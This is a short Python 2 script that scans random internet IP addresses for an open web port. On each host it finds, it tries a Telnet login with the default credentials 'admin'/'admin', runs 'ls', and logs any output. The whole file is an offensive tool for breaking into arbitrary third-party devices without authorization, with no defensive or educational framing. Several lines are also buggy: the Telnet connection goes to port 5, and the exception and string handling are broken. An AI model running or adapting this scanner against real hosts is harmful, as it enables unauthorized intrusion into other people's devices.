import socket, os, time, telnetlib
from random import randint

def randip():
    while True:
        yield ".".join(str(randint(1, 255)) for i in range(4))

a = []
fp = open("randip_log.txt", 'w')
for address in randip():
	try:
		s = socket.socket()
		s.settimeout(3)
		s.connect((address, 80))
		print address, "WORKS!!!"
		hostbyadr = socket.gethostbyaddr(address)
		print hostbyadr
		print "\n"
		fp.write(address)
		fp.write("\n")
		fp.write(str(hostbyadr))
		fp.write("\n")
		print('Beginning Telnet attempt on %s\n' % address)
		tn = telnetlib.Telnet(address, 5)
		tn.read_until("login: ")
		tn.write('admin' + '\n')
		time.sleep(2)
		tn.read_until('Password: ')
		tn.write('admin' + '\n')
		time.sleep(3)
		tn.write("ls\n")
		tn.write("exit\n")
		print tn.read_all()
		fp.write(tn.read_all())
		tn.close()
		fp.write('\n')
		a.append(address)
		print('Hosts Attempted' + a + '\n')
	except socket.error or EOFError:
		if len(a) != 4:
			continue
		else:
			print "..."
			fp.close()
			break
